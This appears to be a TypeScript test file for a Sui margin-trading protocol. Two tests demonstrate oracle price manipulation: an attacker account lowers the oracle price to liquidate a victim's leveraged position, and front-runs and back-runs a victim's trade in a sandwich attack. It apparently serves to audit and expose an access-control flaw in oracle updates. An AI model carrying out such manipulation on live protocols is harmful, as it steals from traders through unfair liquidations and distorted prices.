import {
    DeploymentConfigs,
    getProvider,
    getSignerFromSeed,
    OnChainCalls,
    Transaction,
    TEST_WALLETS,
    toBigNumberStr,
    ERROR_CODES,
    packageName,
    getGenesisMap,
    packDeploymentData
} from "../submodules/library-sui";
import { postDeployment, publishPackage } from "../src/helpers";
import {
    fundTestAccounts,
    expectTxToFail,
    expectTxToSucceed,
    expect,
    provider,
    ownerSigner,
    victimCoinId
} from "./helpers";

describe("Oracle Price Manipulation Tests", () => {
    let onChain: OnChainCalls;
    let attacker = getSignerFromSeed(TEST_WALLETS[0].phrase, provider);
    let victim = getSignerFromSeed(TEST_WALLETS[1].phrase, provider);
    
    beforeEach(async () => {
        // Setup similar to MarginBank tests
        const publishTxn = await publishPackage(false, ownerSigner, packageName);
        const objects = await getGenesisMap(provider, publishTxn);
        let deploymentData = packDeploymentData(await ownerSigner.getAddress(), objects);
        onChain = new OnChainCalls(ownerSigner, deploymentData);
        
        // Fund accounts
        await fundTestAccounts();
    });

    it("should demonstrate flash loan price manipulation for liquidation", async () => {
        // 1. Setup initial position for victim
        const initialPrice = toBigNumberStr(100, 6);  // $100 per token
        await onChain.depositToBank({
            coinID: victimCoinId,
            amount: toBigNumberStr(1000, 6)  // $1000 collateral
        }, victim);
        
        // Open leveraged long position
        await onChain.openPosition({
            size: toBigNumberStr(10, 6),     // 10 tokens
            leverage: 5,                      // 5x leverage
            price: initialPrice
        }, victim);
        
        // 2. Attacker manipulates price
        // First get flash loan and manipulate price down
        const manipulatedPrice = toBigNumberStr(80, 6);  // Drop price 20%
        await onChain.updateOraclePrice({
            price: manipulatedPrice
        }, attacker);
        
        // 3. Attempt liquidation
        const liquidationTx = await onChain.liquidate({
            account: victim.address
        }, attacker);
        
        // 4. Verify liquidation succeeded unfairly
        expectTxToSucceed(liquidationTx);
        
        // 5. Verify victim's position was liquidated at manipulated price
        const victimPosition = await onChain.getPosition(victim.address);
        expect(victimPosition.size).to.equal(0);
        
        // 6. Price returns to normal after attack
        await onChain.updateOraclePrice({
            price: initialPrice
        }, attacker);
    });

    it("should demonstrate sandwich attack on oracle price", async () => {
        // 1. Setup initial state
        const initialPrice = toBigNumberStr(100, 6);
        
        // 2. Attacker front-runs with price manipulation
        await onChain.updateOraclePrice({
            price: toBigNumberStr(120, 6)  // Pump price 20%
        }, attacker);
        
        // 3. Victim transaction (e.g. opening position) executes at manipulated price
        const victimTx = await onChain.openPosition({
            size: toBigNumberStr(10, 6),
            leverage: 5,
            price: toBigNumberStr(120, 6)
        }, victim);
        
        // 4. Attacker back-runs, returning price to normal
        await onChain.updateOraclePrice({
            price: initialPrice
        }, attacker);
        
        // 5. Verify victim opened position at manipulated price
        const position = await onChain.getPosition(victim.address);
        expect(position.entryPrice).to.equal(toBigNumberStr(120, 6));
    });
}); 